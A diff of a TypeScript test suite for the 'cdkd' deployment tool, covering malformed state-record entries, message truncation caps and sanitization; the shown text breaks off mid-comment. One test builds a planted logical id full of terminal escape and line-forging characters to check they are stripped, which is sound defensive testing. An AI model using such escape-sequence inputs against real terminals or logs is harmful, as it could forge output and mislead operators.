@@ -6,12 +6,14 @@ import { fileURLToPath } from 'node:url';
 import { dirname, join } from 'node:path';
 import {
   STATE_RESOURCES_MALFORMED,
+  divergentRecordRegionRefusalMessage,
   hasReadableOutputs,
   hasReadableResources,
   isReadableBag,
   malformedDeployResourcesRefusalMessage,
   malformedDestroyOutputsRefusalMessage,
   malformedDestroyResourcesRefusalMessage,
+  malformedExportNamesWarning,
   malformedExportSourceWarning,
   malformedLocalOutputsWarning,
   malformedNestedChildOutputsRefusalMessage,
@@ -19,6 +21,9 @@ import {
   malformedOutputsRefusalMessage,
   malformedOutputsWarning,
   malformedRenderedContainersWarning,
+  malformedResourceEntriesRefusalMessage,
+  malformedResourceEntriesWarning,
+  malformedOrphanRecordsWarning,
   malformedResourcePropertiesRefusalMessage,
   malformedResourcePropertiesWarning,
   malformedResourcesWarning,
@@ -26,14 +31,17 @@ import {
   refuseMalformedNestedChildOutputs,
   refuseMalformedOutputs,
   refuseMalformedOutputsForDestroy,
+  refuseMalformedResourceEntries,
   refuseMalformedResourceProperties,
   refuseMalformedResourcePropertiesForOrphan,
   refuseMalformedResourcesForDeploy,
   refuseMalformedResourcesForDestroy,
   refuseMalformedState,
   repairMalformedOutputsForReadOnly,
+  repairMalformedResourceEntriesForReadOnly,
   repairMalformedResourcePropertiesForReadOnly,
   repairMalformedResourcesForReadOnly,
+  unreadableResourceEntries,
   unreadableResourcePropertyBags,
   type RenderedStateContainer,
   producerRecordKey,
@@ -90,8 +98,16 @@ const UNREADABLE: ReadonlyArray<readonly [string, unknown]> = [
   ['absent', undefined],
   ['an array', []],
   ['a number', 5],
-  ['a boolean', true],
+  ['zero', 0],
+  ['negative zero', -0],
+  ['Infinity', Infinity],
+  ['-Infinity', -Infinity],
   ['a string', 'ab'],
+  // JSON carries booleans too, and a mutant accepting them survived every other
+  // case here: `Object.entries(true)` is `[]`, so nothing crashes and nothing
+  // fabricates — the record is simply reported as an empty stack, silently.
+  ['true', true],
+  ['false', false],
 ];
 
 describe('repairMalformedResourcesForReadOnly', () => {
@@ -116,6 +132,271 @@ describe('repairMalformedResourcesForReadOnly', () => {
     const bag = {};
     const s = state(bag);
     expect(repairMalformedResourcesForReadOnly(s)).toBe(false);
+    expect(s.resources).toBe(bag);
+  });
+});
+
+/**
+ * Every shape a hand-edited ENTRY can carry that is not a readable record.
+ *
+ * Kept apart from {@link UNREADABLE} even though the predicate is the same one:
+ * `undefined` is NOT here. An `undefined` value does not survive
+ * `JSON.parse`, so it cannot arrive from a stored record — and an entry
+ * explicitly assigned `undefined` in memory would be dropped by the next
+ * `JSON.stringify` anyway. Listing it would fence a shape no record has.
+ */
+const UNREADABLE_ENTRY: ReadonlyArray<readonly [string, unknown]> = [
+  ['null', null],
+  ['an array', []],
+  ['a number', 5],
+  ['zero', 0],
+  ['negative zero', -0],
+  ['Infinity', Infinity],
+  ['-Infinity', -Infinity],
+  ['a string', 'ab'],
+  // Why THESE: each is a shape `JSON.parse` really produces and whose
+  // bypass would be INVISIBLE in output. The empty string and the two
+  // zeroes are falsy, so a truthiness check lets them through, and `-0`
+  // additionally survives a `=== 0` exemption written as `Object.is`.
+  // The infinities come from `JSON.parse('1e400')`, which is a number a
+  // hand-edited record can hold. The two list sizes separate a
+  // SHAPE-based guard from a LENGTH-based one — both are dereferenced
+  // the same way, so only a length-dependent bypass tells them apart.
+  // `NaN` is absent because `JSON.parse` cannot produce it.
+  ['an empty string', ''],
+  ['a populated list', [{ physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} }]],
+  // An OBJECT with no resource type. It passes an object-ness test and then
+  // throws on `resource.resourceType.startsWith(...)`, which is why the entry
+  // predicate asks for the type rather than only for object-ness.
+  ['an object with no resourceType', { physicalId: 'p', properties: {} }],
+  ['true', true],
+  ['false', false],
+];
+
+const HEALTHY = { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} };
+
+describe('unreadableResourceEntries', () => {
+  for (const [label, value] of UNREADABLE_ENTRY) {
+    it(`names an entry that is ${label}, and only that entry`, () => {
+      const names = unreadableResourceEntries(state({ Good: HEALTHY, Bad: value }));
+      expect(names).toEqual(['Bad']);
+    });
+  }
+
+  it('names EVERY unreadable entry, not the first one', () => {
+    // A `.slice(0, 1)` on the result survived every other case here, because
+    // each fixture carried exactly one bad entry. The consequence is not
+    // cosmetic: the repair below removes only what this returns, so a second
+    // `null` would survive it and crash the walk the repair exists to protect.
+    const names = unreadableResourceEntries(
+      state({ A: null, Good: HEALTHY, B: 'ab', C: [], D: 5, E: true })
+    );
+    expect([...names].sort()).toEqual(['A', 'B', 'C', 'D', 'E']);
+  });
+
+  it('names nothing for a healthy bag, empty included', () => {
+    expect(unreadableResourceEntries(state({}))).toEqual([]);
+    expect(unreadableResourceEntries(state({ A: HEALTHY }))).toEqual([]);
+  });
+
+  // The shapes that DISCRIMINATE, and they are the POPULATED ones — a fact the
+  // fixtures have to carry, not the comment. `Object.entries` of a string or of
+  // a non-empty array yields one pair per element, so a guard narrowed to leave
+  // either shape through reports "unreadable entries" named `0`, `1`, … — rows
+  // that do not exist, in a message whose whole job is to name real ones.
+  for (const [label, value] of [
+    ['a STRING', 'ab'],
+    ['a POPULATED list of non-objects', ['a', 'b']],
+  ] as const) {
+    it(`answers [] for ${label} bag rather than inventing one id per element`, () => {
+      expect(unreadableResourceEntries(state(value))).toEqual([]);
+    });
+  }
+
+  for (const [label, value] of UNREADABLE) {
+    it(`answers [] for a bag that is ${label}`, () => {
+      // `null` and `absent` discriminate too — `Object.entries(null)` THROWS, so
+      // a guard narrowed away from them reds here rather than fabricating. The
+      // genuinely inert members are `5`, `true`, `false` and the EMPTY `[]`,
+      // whose `Object.entries` is `[]` either way. Nothing here pins THOSE, and
+      // nothing can: a guard bypassed for them produces the identical output.
+      // They are listed so a future widening of the predicate is measured
+      // against the whole population rather than against the two shapes that
+      // bite.
+      expect(unreadableResourceEntries(state(value))).toEqual([]);
+    });
+  }
+
+  it('keeps its bag guard, structurally — the inert shapes have no other fence', () => {
+    // The one thing that CAN be asserted for `5` / `true` / `false` / `[]`: that
+    // the early return is still written. No assertion over this helper's output
+    // distinguishes a guard that ran from one bypassed for those shapes, so
+    // without this a narrowing like
+    // `typeof bag !== 'boolean' && !hasReadableResources(state)` is caught by
+    // nothing at all. Read from comment-stripped source, so the prose above the
+    // guard cannot satisfy it.
+    const module = code('src/state/malformed-resources-bag.ts');
+    const fn = module.slice(module.indexOf('export function unreadableResourceEntries'));
+    const body = fn.slice(0, fn.indexOf('\n}\n'));
+    // UNCONDITIONAL, and that is the part a presence-and-position check misses:
+    // wrapping the guard in `if (typeof state.resources !== 'boolean')` keeps it
+    // present, keeps it above the walk, and skips it for exactly the shapes no
+    // output assertion can see. So the guard must be the FIRST statement of the
+    // body — nothing can gate what runs first.
+    const statements = body
+      .slice(body.indexOf('{') + 1)
+      .split('\n')
+      .map((line) => line.trim())
+      .filter(Boolean);
+    expect(
+      statements[0],
+      'the bag guard is no longer the FIRST statement of unreadableResourceEntries, so something ' +
+        'can now gate it — for a boolean or numeric bag no assertion over the output would notice.'
+    ).toBe('if (!hasReadableResources(state)) return [];');
+    // ...and it still precedes the walk it protects.
+    expect(body.indexOf('hasReadableResources(')).toBeLessThan(body.indexOf('Object.entries('));
+  });
+
+  it('agrees with the bag predicate on every shape it rejects', () => {
+    // A RELATION between the two predicates, and the honest limit is worth
+    // stating: for a shape whose `Object.entries` is inert — `5`, `true`,
+    // `false`, an EMPTY `[]` — no assertion over this helper's OUTPUT can tell
+    // a guard that ran from one that was bypassed, because the fallthrough
+    // produces `[]` either way. A narrowing like
+    // `typeof bag !== 'boolean' && !hasReadableResources(bag)` therefore
+    // survives this case, and that is a property of the shapes rather than of
+    // the case. What this DOES pin is that the two predicates still answer
+    // together, so a future widening of one is measured against the other
+    // rather than against nothing; the POPULATED cases above are what pin the
+    // guard executing.
+    for (const [label, value] of UNREADABLE) {
+      const s = state(value);
+      expect(hasReadableResources(s), `${label} is no longer an unreadable bag`).toBe(false);
+      expect(unreadableResourceEntries(s), `${label} now yields entry names`).toEqual([]);
+    }
+  });
+});
+
+describe('refuseMalformedResourceEntries', () => {
+  for (const [label, value] of UNREADABLE_ENTRY) {
+    it(`refuses an entry that is ${label}, naming it, with a named code`, () => {
+      let thrown: unknown;
+      try {
+        refuseMalformedResourceEntries(
+          state({ Good: HEALTHY, BrokenRow: value }),
+          'MyStack',
+          'eu-west-1'
+        );
+      } catch (err) {
+        thrown = err;
+      }
+      expect(thrown).toBeInstanceOf(CdkdError);
+      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
+      // The logical id is the whole point: `refuseMalformedState`'s text can
+      // only say "the bag", while a reader of THIS one has to know which row to
+      // open.
+      expect((thrown as CdkdError).message).toContain('BrokenRow');
+      expect((thrown as CdkdError).message).toContain('MyStack');
+      expect((thrown as CdkdError).message).toContain('WRITE');
+      // The REGION reaches the remedy as the region, not as a second copy of
+      // the stack name: passing `stackName` twice left every other assertion
+      // green and pointed the command at a record in the wrong place. Distinct
+      // values on both sides are what make this a discriminator.
+      expect((thrown as CdkdError).message).toContain(
+        'cdkd state show MyStack --stack-region eu-west-1 --json'
+      );
+      // ...and must not name the healthy sibling, or the remedy sends the user
+      // to a row that is fine.
+      expect((thrown as CdkdError).message).not.toContain('Good');
+    });
+  }
+
+  it('forwards the WHOLE list to the message, not the first entry', () => {
+    // The refusal's own hop, which the discovery and repair cases do not cover:
+    // a `.slice(0, 1)` between the helper and the message survived all of them,
+    // and the user would then repair one row and hit the next on the re-run.
+    // Six rows against the five-name cap, so the count, the names AND the
+    // overflow summary all have to come from the full list.
+    const bag: Record<string, unknown> = { Good: HEALTHY };
+    for (const id of ['A1', 'B2', 'C3', 'D4', 'E5', 'F6']) bag[id] = null;
+    let thrown: unknown;
+    try {
+      refuseMalformedResourceEntries(state(bag), 'S', 'r');
+    } catch (err) {
+      thrown = err;
+    }
+    const message = (thrown as CdkdError).message;
+    expect(message).toContain('6 resource record(s)');
+    for (const id of ['A1', 'B2', 'C3', 'D4', 'E5']) expect(message).toContain(id);
+    expect(message).toContain('and 1 more');
+  });
+
+  it('passes a healthy bag through, empty included', () => {
+    expect(() => refuseMalformedResourceEntries(state({}), 'S', 'r')).not.toThrow();
+    expect(() => refuseMalformedResourceEntries(state({ A: HEALTHY }), 'S', 'r')).not.toThrow();
+  });
+
+  it('stays silent on an unreadable BAG — that is the other refusal to make', () => {
+    // Composition rule, asserted rather than left to a comment. A caller pairs
+    // this with `refuseMalformedState`; if this one ALSO threw for a bag it
+    // would have to invent row names from a shape that has none, and the
+    // message's whole job is to name real ones.
+    for (const [, value] of UNREADABLE) {
+      expect(() => refuseMalformedResourceEntries(state(value), 'S', 'r')).not.toThrow();
+    }
+  });
+
+  it('does NOT mutate the record it refuses', () => {
+    // The refusal's value over a repair is that the evidence SURVIVES, and
+    // nothing else here pins it: swapping `unreadableResourceEntries` for the
+    // read-only repair inside the refusal still throws, still names the row,
+    // and deletes it from the record on the way out — every other case in this
+    // file stays green.
+    const bad = null;
+    const bag: Record<string, unknown> = { Good: HEALTHY, BrokenRow: bad };
+    const s = state(bag);
+    expect(() => refuseMalformedResourceEntries(s, 'S', 'r')).toThrow();
+    // The same bag object, the same keys, the same values by identity.
+    expect(s.resources).toBe(bag);
+    expect(Object.keys(s.resources)).toEqual(['Good', 'BrokenRow']);
+    expect((s.resources as Record<string, unknown>)['BrokenRow']).toBe(bad);
+    expect(s.resources['Good']).toBe(HEALTHY);
+  });
+});
+
+describe('repairMalformedResourceEntriesForReadOnly', () => {
+  for (const [label, value] of UNREADABLE_ENTRY) {
+    it(`drops an entry that is ${label} and reports it, keeping the readable ones`, () => {
+      const s = state({ Good: HEALTHY, Bad: value });
+      expect(repairMalformedResourceEntriesForReadOnly(s)).toEqual(['Bad']);
+      // The survivor is the SAME object — a read-only repair must not rebuild
+      // the records it keeps.
+      expect(s.resources['Good']).toBe(HEALTHY);
+      expect(Object.keys(s.resources)).toEqual(['Good']);
+    });
+  }
+
+  it('drops EVERY unreadable entry, leaving a bag the walk can finish', () => {
+    // The half that matters at the call sites: a repair removing only the first
+    // bad row leaves the next one to throw in the loop below it, which is the
+    // failure this whole change is about — moved one entry along.
+    const s = state({ A: null, Good: HEALTHY, B: 'ab', C: [], D: 5, E: false });
+    expect([...repairMalformedResourceEntriesForReadOnly(s)].sort()).toEqual([
+      'A',
+      'B',
+      'C',
+      'D',
+      'E',
+    ]);
+    expect(Object.keys(s.resources)).toEqual(['Good']);
+    // Every survivor is readable, so a walk over what is left cannot throw.
+    for (const entry of Object.values(s.resources)) expect(isReadableBag(entry)).toBe(true);
+  });
+
+  it('drops nothing from a healthy bag', () => {
+    const bag = { A: HEALTHY };
+    const s = state(bag);
+    expect(repairMalformedResourceEntriesForReadOnly(s)).toEqual([]);
     expect(s.resources).toBe(bag);
   });
 });
@@ -186,18 +467,6 @@ describe('repairMalformedOutputsForReadOnly (issue go-to-k/cdkd#3189)', () => {
     // did not have, even in memory, or a later reader cannot tell the two
     // apart.
     expect(s.outputs).toBeUndefined();
-  });
-
-  it('repairs a BOOLEAN too — the shape the shared table does not carry', () => {
-    // `UNREADABLE` is `refuseMalformedState`'s table and stops at `'ab'`; a
-    // boolean is the fifth shape a hand-edited record reaches this path with,
-    // and `Object.entries(true)` is `[]`, so it fabricates nothing and could
-    // look exempt. It is repaired anyway: `hasOwnProperty.call(true, k)` is the
-    // lookup the resolver makes one call earlier, and a record holding `true`
-    // where a map belongs is malformed whatever the walk does with it.
-    const s = withOutputs(true);
-    expect(repairMalformedOutputsForReadOnly(s)).toBe(true);
-    expect(s.outputs).toEqual({});
   });
 
   it('leaves a populated bag byte-identical and reports no repair', () => {
@@ -366,9 +635,13 @@ describe('the malformed-outputs REFUSAL text (issue go-to-k/cdkd#3192)', () => {
     // Asserted as a DISTANCE, not `endsWith`: the template satisfies an
     // endsWith check with or without a cap.
     const long = malformedOutputsRefusalMessage('q'.repeat(5000), 'us-east-1');
-    expect(long).toContain(`${'q'.repeat(128)}...`);
+    // At the STACK cap (1152 code points, a nested `Parent~Child` chain), not
+    // an identifier's 128: the name is printed twice, prose and command, and a
+    // legitimate nested name cut shorter names a stack that does not exist.
+    expect(long).toContain(`${'q'.repeat(1152)}...`);
+    expect(long).not.toContain('q'.repeat(1153));
     expect(long).toContain('cdkd state show');
-    expect(long.length).toBeLessThan(1500);
+    expect(long.length).toBeLessThan(3200);
   });
 });
 
@@ -408,10 +681,14 @@ describe('the gate-scoped outputs texts (issue go-to-k/cdkd#3207)', () => {
     });
 
     it(`${label} CAPS a multi-kilobyte name so the remedy stays on screen`, () => {
+      // By the STACK rule (`STACK_REF_MAX_CODE_POINTS`, 1152), which every
+      // builder in this module takes for a stack name; the cross-builder case
+      // below asserts the same cap for each occurrence.
       const long = build('q'.repeat(5000), 'us-east-1');
-      expect(long).toContain(`${'q'.repeat(128)}...`);
+      expect(long).toContain(`${'q'.repeat(1152)}...`);
+      expect(long).not.toContain('q'.repeat(1153));
       expect(long).toContain('cdkd state show');
-      expect(long.length).toBeLessThan(1500);
+      expect(long.length).toBeLessThan(3200);
     });
 
     it(`${label} names the container it is about`, () => {
@@ -588,10 +865,14 @@ describe('the gate-scoped resources texts (issue go-to-k/cdkd#3161)', () => {
     });
 
     it(`${label} CAPS a multi-kilobyte name so the remedy stays on screen`, () => {
+      // By the STACK rule (`STACK_REF_MAX_CODE_POINTS`, 1152) every builder in
+      // this module takes for a stack name; the cross-builder case asserts the
+      // same cap for each occurrence.
       const long = build('q'.repeat(5000), 'us-east-1');
-      expect(long).toContain(`${'q'.repeat(128)}...`);
+      expect(long).toContain(`${'q'.repeat(1152)}...`);
+      expect(long).not.toContain('q'.repeat(1153));
       expect(long).toContain('cdkd state show');
-      expect(long.length).toBeLessThan(2000);
+      expect(long.length).toBeLessThan(3600);
     });
   }
 
@@ -707,13 +988,18 @@ describe('the gate-scoped resources texts (issue go-to-k/cdkd#3161)', () => {
   const INEXACT: ReadonlyArray<readonly [string, string, string]> = [
     ['a TRIMMED stack name', 'prod-api ', 'us-east-1'],
     ['a stack name with a SUBSTITUTED character', 'pro\u0000d', 'us-east-1'],
-    // Past STACK_REF_MAX_CODE_POINTS (1152), the cap THIS message measures
-    // against — not the 128 the module's other texts use. A 400-character name
+    // Past STACK_REF_MAX_CODE_POINTS (1152), the stack cap every text in this
+    // module uses and the one THIS message's exactness gate measures against —
+    // not a region's 128. A 400-character name
     // renders exactly here on purpose: an ordinary multi-level nested child
     // runs past 150 code points, and truncating one put a HEALTHY record in
     // the withhold arm (review round 2 of go-to-k/cdkd#3332).
     ['a TRUNCATED stack name', `${'q'.repeat(5000)}`, 'us-east-1'],
     ['a TRIMMED region', 'prod-api', ' us-east-1'],
+    // Past a REGION's cap (128), which `malformedStateDetail` renders it at, so
+    // 128 is what "renders exactly" means for the region half of the gate — a
+    // gate measuring the region at the stack cap would name this one.
+    ['a TRUNCATED region', 'prod-api', 'r'.repeat(129)],
   ];
 
   for (const [label, stack, region] of INEXACT) {
@@ -770,7 +1056,7 @@ describe('the gate-scoped resources texts (issue go-to-k/cdkd#3161)', () => {
     }
   });
 
-  it('measures exactness against the STATE-RECORD cap, not the 128 its siblings use', () => {
+  it('measures exactness against the STATE-RECORD cap, not a region-sized 128', () => {
     // The boundary, both sides. Without the lower row a cap regression to 128
     // passes every case above; without the upper one the cap could vanish
     // entirely and a planted multi-kilobyte name would still be named.
@@ -785,6 +1071,16 @@ describe('the gate-scoped resources texts (issue go-to-k/cdkd#3161)', () => {
       malformedDestroyResourcesRefusalMessage('q'.repeat(2000), 'us-east-1'),
       'a multi-kilobyte name is named, so the cap has stopped bounding anything'
     ).not.toContain('cdkd state orphan');
+    // The EDGE itself, so a gate measured against some other cap between the
+    // two rows above cannot pass: exactly the cap is named, one past is not.
+    expect(
+      malformedDestroyResourcesRefusalMessage('q'.repeat(1152), 'us-east-1'),
+      'a name exactly at STACK_REF_MAX_CODE_POINTS is withheld'
+    ).toContain('cdkd state orphan');
+    expect(
+      malformedDestroyResourcesRefusalMessage('q'.repeat(1153), 'us-east-1'),
+      'a name one past STACK_REF_MAX_CODE_POINTS is named'
+    ).not.toContain('cdkd state orphan');
   });
 
   it('keeps the removal target for an EXACT identity — the control for the gate', () => {
@@ -793,6 +1089,12 @@ describe('the gate-scoped resources texts (issue go-to-k/cdkd#3161)', () => {
     const m = malformedDestroyResourcesRefusalMessage('prod-api', 'us-east-1');
     expect(m).toContain('cdkd state orphan <stack> --stack-region <region>');
     expect(m).not.toContain('does NOT render exactly');
+    // The region's own edge, from below: exactly its cap still renders
+    // exactly, so a gate measuring the region at a SMALLER cap cannot pass.
+    expect(
+      malformedDestroyResourcesRefusalMessage('prod-api', 'r'.repeat(128)),
+      'a region exactly at its 128 cap is withheld'
+    ).toContain('cdkd state orphan');
   });
 
   it('the DEPLOY refusal names the RE-CREATE, and holds under --dry-run', () => {
@@ -946,9 +1248,13 @@ describe('the malformed export-SOURCE warning (issue go-to-k/cdkd#3192)', () => 
     // the producer name here comes off an S3 KEY during a rebuild, with no
     // user in the loop to have typed it.
     const long = malformedExportSourceWarning('q'.repeat(5000), 'us-east-1');
-    expect(long).toContain(`${'q'.repeat(128)}...`);
+    // At the STACK cap (1152 code points, a nested `Parent~Child` chain), not
+    // an identifier's 128: the name is printed twice, prose and command, and a
+    // legitimate nested name cut shorter names a stack that does not exist.
+    expect(long).toContain(`${'q'.repeat(1152)}...`);
+    expect(long).not.toContain('q'.repeat(1153));
     expect(long).toContain('cdkd state show');
-    expect(long.length).toBeLessThan(1500);
+    expect(long.length).toBeLessThan(3200);
   });
 });
 
@@ -1034,6 +1340,435 @@ describe('refuseMalformedState', () => {
   it('passes a readable bag through, empty included', () => {
     expect(() => refuseMalformedState(state({}), 'S', 'r')).not.toThrow();
     expect(() => refuseMalformedState(state({ A: {} }), 'S', 'r')).not.toThrow();
+  });
+});
+
+describe('the entry-level text', () => {
+  it('caps the names it prints and says how many it did not', () => {
+    const ids = ['A1', 'B2', 'C3', 'D4', 'E5', 'F6', 'G7'];
+    const message = malformedResourceEntriesRefusalMessage('MyStack', 'eu-west-1', ids);
+    for (const named of ids.slice(0, 5)) expect(message).toContain(named);
+    // The cap is the reason the remedy command survives on screen at all, so
+    // the ones past it must be COUNTED rather than silently dropped.
+    expect(message).not.toContain('F6');
+    expect(message).not.toContain('G7');
+    expect(message).toContain('and 2 more');
+    expect(message).toContain('7 resource record(s)');
+  });
+
+  it('does not say "and 0 more" at EXACTLY the cap', () => {
+    // FIVE names against a five-name cap — the boundary itself. With two names
+    // the `rest > 0` test could be widened to `rest >= 0` and survive, so the
+    // case would credit a boundary it never reached.
+    const message = malformedResourceEntriesRefusalMessage('S', 'r', [
+      'A1',
+      'B2',
+      'C3',
+      'D4',
+      'E5',
+    ]);
+    expect(message).toContain('A1');
+    expect(message).toContain('E5');
+    // The SUMMARY clause, not the word: the refusal's own prose already says
+    // "with no more to go on", so a bare `not.toContain('more')` fails on
+    // correct text — it did, which is why this is a shape.
+    expect(message).not.toMatch(/and \d+ more/);
+
+    // BELOW the cap as well as AT it. `rest > 0` widened to `rest !== 0` is
+    // true for every count under the cap, so a single unreadable entry would
+    // print "and -4 more" — an arm the exact-cap case cannot reach.
+    for (const count of [1, 2, 3, 4]) {
+      const ids = Array.from({ length: count }, (_, i) => `R${i}`);
+      for (const [label, text] of [
+        ['the refusal', malformedResourceEntriesRefusalMessage('S', 'r', ids)],
+        ['the warning', malformedResourceEntriesWarning('S', 'r', ids)],
+      ] as const) {
+        expect(text, `${label}: ${count} names below the cap gained a summary`).not.toMatch(
+          /and -?\d+ more/
+        );
+      }
+    }
+  });
+
+  it('sanitizes and caps a planted logical id — it is read out of the record', () => {
+    // A logical id reaches this text from the same hand-edited record the
+    // message is about, so it is no more trusted than the stack name beside
+    // it. Unsanitized it could forge a line and append its own instruction to
+    // the command this text tells the reader to run; uncapped it could push
+    // that command off the screen.
+    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
+    const hostile = `Evil${FORGERIES.join('')}Row`;
+    for (const forge of FORGERIES) {
+      expect(hostile.includes(forge), `probe input lost ${JSON.stringify(forge)}`).toBe(true);
+    }
+    const message = malformedResourceEntriesRefusalMessage('S', 'r', [
+      hostile,
+      'z'.repeat(5000),
+    ]);
+    for (const forge of FORGERIES) expect(message).not.toContain(forge);
+    // At CloudFormation's 255, not a region's 128: a legitimate 129-to-255-
+    // character CDK id cut shorter names a row the record does not hold.
+    expect(message).toContain(`${'z'.repeat(255)} [cut: 4745 more characters withheld]`);
+    expect(message).not.toContain('z'.repeat(256));
+    // A logical id with nothing renderable left takes the stand-in too, not an
+    // empty pair of quotes naming nothing. Its own fixture, because the stack
+    // and region stand-ins are asserted separately and a shared
+    // `toContain(UNRENDERABLE)` would pass on any one of the three.
+    const blankId = malformedResourceEntriesRefusalMessage('S', 'r', ['\u0000\u0001']);
+    expect(blankId).toContain(`— ${UNRENDERABLE} —`);
+    // The remedy is still on screen after the cap — a DISTANCE, the same oracle
+    // the rendered-containers case uses and for the same reason.
+    expect(message.length).toBeLessThan(1200);
+  });
+
+  it("the ORPHAN warning caps, counts and sanitizes its ids like its `resources` sibling", () => {
+    // The clauses the new text does not inherit by being a copy: the five-name
+    // cap, the overflow suffix and `displayLogicalId`. Each was a surviving
+    // mutant until this case (round-5 proxy pass).
+    const six = malformedOrphanRecordsWarning('S', 'r', ['A1', 'B2', 'C3', 'D4', 'E5', 'F6']);
+    expect(six).toContain('A1, B2, C3, D4, E5 and 1 more');
+    // Dropping the `.slice` prints the sixth name; this is the assertion that
+    // sees it.
+    expect(six).not.toContain('F6');
+
+    // EXACTLY at the cap: no overflow suffix, so `rest >= 0` reds here.
+    const five = malformedOrphanRecordsWarning('S', 'r', ['A1', 'B2', 'C3', 'D4', 'E5']);
+    expect(five).toContain('A1, B2, C3, D4, E5 —');
+    expect(five).not.toContain('more');
+
+    // The ids go through `displayLogicalId`, not a bare interpolation: a
+    // padded id is QUOTED so it cannot imitate a healthy sibling, a control
+    // byte never reaches the terminal, and a long one is cut with the marker.
+    const hostile = malformedOrphanRecordsWarning('S', 'r', [
+      'Bucket ',
+      'E\u001b[31mvil',
+      'q'.repeat(IDENT_MAX_CODE_POINTS + 50),
+    ]);
+    // Trimmed by the sanitizer and then QUOTED, which is what keeps it
+    // visibly distinct from a healthy `Bucket`.
+    expect(hostile).toContain('"Bucket"');
+    expect(hostile).not.toContain('\u001b');
+    expect(hostile).toContain('characters withheld');
+    expect(hostile).not.toContain('q'.repeat(IDENT_MAX_CODE_POINTS + 1));
+    // ...and an id-less record renders as the stand-in rather than empty.
+    expect(malformedOrphanRecordsWarning('S', 'r', [''])).toContain(UNRENDERABLE);
+  });
+
+  it('EVERY message builder caps a stack by the stack rule and a region by the region rule', () => {
+    // The invariant rather than one site of it. The cap used to be a DEFAULTED
+    // parameter whose default was the region's, and stack sites that forgot to
+    // pass the wider one were found one at a time across two review rounds —
+    // the last of them in `malformedOutputsWarning`, which no case here reached
+    // with a long name. Every builder, and every OCCURRENCE in each: the entry
+    // texts print the stack twice, and a `toContain` on the long run would pass
+    // with either copy cut short.
+    //
+    // EXCLUDED, with the reason rather than by omission:
+    // `divergentRecordRegionRefusalMessage` (go-to-k/cdkd#3328) measures and
+    // prints its KEY region at the state-record grammar's cap rather than a
+    // region's 128, which its own note argues for — so it is the one builder
+    // this invariant does not hold for. Excluding it here is what would leave
+    // its caps pinned nowhere, so the case below pins them instead.
+    const STACK = 'Q'.repeat(5000);
+    const REGION = 'R'.repeat(5000);
+    const builders: ReadonlyArray<readonly [string, string]> = [
+      ['malformedStateRefusalMessage', malformedStateRefusalMessage(STACK, REGION)],
+      ['malformedResourcesWarning', malformedResourcesWarning(STACK, REGION)],
+      ['malformedOutputsWarning', malformedOutputsWarning(STACK, REGION)],
+      ['malformedOutputsRefusalMessage', malformedOutputsRefusalMessage(STACK, REGION)],
+      ['malformedExportSourceWarning', malformedExportSourceWarning(STACK, REGION)],
+      ['malformedExportNamesWarning', malformedExportNamesWarning(STACK, REGION)],
+      [
+        'malformedRenderedContainersWarning',
+        malformedRenderedContainersWarning(STACK, REGION, ['outputs']),
+      ],
+      ['malformedResourceEntriesWarning', malformedResourceEntriesWarning(STACK, REGION, ['X'])],
+      ['malformedOrphanRecordsWarning', malformedOrphanRecordsWarning(STACK, REGION, ['X'])],
+      [
+        'malformedResourceEntriesRefusalMessage',
+        malformedResourceEntriesRefusalMessage(STACK, REGION, ['X']),
+      ],
+      ['malformedDestroyOutputsRefusalMessage', malformedDestroyOutputsRefusalMessage(STACK, REGION)],
+      [
+        'malformedNestedChildOutputsRefusalMessage',
+        malformedNestedChildOutputsRefusalMessage(STACK, REGION),
+      ],
+      ['malformedLocalOutputsWarning', malformedLocalOutputsWarning(STACK, REGION)],
+      // The destroy refusal is absent on purpose: a 5000-character name fails
+      // its exactness gate, and the withhold arm prints no identity at all.
+      [
+        'malformedDeployResourcesRefusalMessage',
+        malformedDeployResourcesRefusalMessage(STACK, REGION),
+      ],
+      [
+        'malformedResourcePropertiesRefusalMessage',
+        malformedResourcePropertiesRefusalMessage(STACK, REGION, ['X']),
+      ],
+      [
+        'malformedResourcePropertiesWarning',
+        malformedResourcePropertiesWarning(STACK, REGION, ['X']),
+      ],
+      [
+        'malformedOrphanResourcePropertiesRefusalMessage',
+        malformedOrphanResourcePropertiesRefusalMessage(STACK, REGION, ['X']),
+      ],
+    ];
+    for (const [name, text] of builders) {
+      // Runs of three or more, so an ordinary capitalised word in the prose
+      // cannot be read as a cut identifier.
+      const stackRuns = (text.match(/Q{3,}/g) ?? []).map((run) => run.length);
+      const regionRuns = (text.match(/R{3,}/g) ?? []).map((run) => run.length);
+      expect(stackRuns.length, `${name} printed no stack`).toBeGreaterThan(0);
+      expect(regionRuns.length, `${name} printed no region`).toBeGreaterThan(0);
+      expect(stackRuns, `${name} cut a stack name at the wrong cap`).toEqual(
+        stackRuns.map(() => 1152)
+      );
+      expect(regionRuns, `${name} cut a region at the wrong cap`).toEqual(
+        regionRuns.map(() => 128)
+      );
+    }
+  });
+
+  it('caps the EXCLUDED builder at the state-record grammar on BOTH identifiers', () => {
+    // The exclusion above is what would otherwise leave
+    // `divergentRecordRegionRefusalMessage`'s caps pinned nowhere:
+    // `state-key-region-authority.test.ts` covers trimming, character
+    // substitution and short exact identifiers, and its long-region case reads
+    // the BACKEND's debug output rather than this builder's boundary. Its gate
+    // compares the raw value against the sanitized one, so the boundary is
+    // observable through which arm it takes: exactly at the cap nothing is
+    // altered and the message names its target; one past, truncation makes them
+    // differ and the withhold arm names none.
+    const namesATarget = (stackName: string, keyRegion: string): boolean =>
+      !divergentRecordRegionRefusalMessage(stackName, keyRegion, 'eu-west-1', 1).includes(
+        'does NOT render exactly'
+      );
+    expect(namesATarget('q'.repeat(1152), 'us-east-1'), 'a stack AT the cap is named').toBe(true);
+    expect(namesATarget('q'.repeat(1153), 'us-east-1'), 'a stack PAST the cap is withheld').toBe(
+      false
+    );
+    // The region's rows are the exclusion itself: measured at a region's 128
+    // the first of them would withhold.
+    expect(namesATarget('prod-api', 'r'.repeat(1152)), 'a key region AT the cap is named').toBe(
+      true
+    );
+    expect(
+      namesATarget('prod-api', 'r'.repeat(1153)),
+      'a key region PAST the cap is withheld'
+    ).toBe(false);
+    // The gate is not the only site holding the cap: the opening RENDERS both
+    // identifiers through their own `safeIdentifier` call, and a rendering site
+    // cut to a region's 128 would keep all four rows above green while printing
+    // a truncated target. At the cap the opening therefore carries each name
